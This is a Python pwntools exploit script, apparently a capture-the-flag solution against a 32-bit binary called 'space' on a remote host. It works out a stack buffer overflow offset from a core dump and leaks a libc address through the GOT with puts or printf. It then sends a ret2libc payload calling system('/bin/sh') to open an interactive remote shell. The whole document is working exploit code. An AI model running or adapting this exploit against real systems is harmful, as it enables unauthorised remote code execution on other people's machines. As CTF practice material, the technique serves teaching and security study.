# coding: utf-8
from pwn import *

HOST, PORT = "139.59.202.58", 30203
elf = context.binary = ELF("./space")

r = elf.process()
r.recvuntil(">")
r.sendline(cyclic(1024))
r.wait()
r.close()

core = Coredump("./core")
buffer_size = cyclic_find(core.fault_addr)

# readelf -r ./space
function_to_leak = "read"

def stdout_fn():
    try:
        return p32(elf.plt["puts"])
    except:
        return p32(elf.plt["printf"])

leak_payload = ("A" * buffer_size) + stdout_fn() + p32(elf.sym["main"]) + p32(elf.got[function_to_leak])

r = remote(HOST, PORT)
r.recvuntil(">")
r.sendline(leak_payload)

leak = r.recvuntil(">")
leaked_offset = u32(leak[1:5])

print function_to_leak + "@offset:", hex(leaked_offset)
print "Now, search for a libc by this function+offset (https://libc.blukat.me)."
print "Note, that you maybe will need to bruteforce libc versions / functions to leak."

libc = ELF(raw_input("Path to libc: ").strip())
offset = libc.sym[function_to_leak]
libc_base = leaked_offset - offset

system_offset = libc.sym["system"]
exit_offset = libc.sym["exit"]
sh_offset = next(libc.search('/bin/sh\x00'))

ret_payload = ("\x90" * buffer_size) + p32(libc_base + system_offset) + p32(libc_base + exit_offset) + p32(libc_base + sh_offset)
r.sendline(ret_payload)
r.interactive()
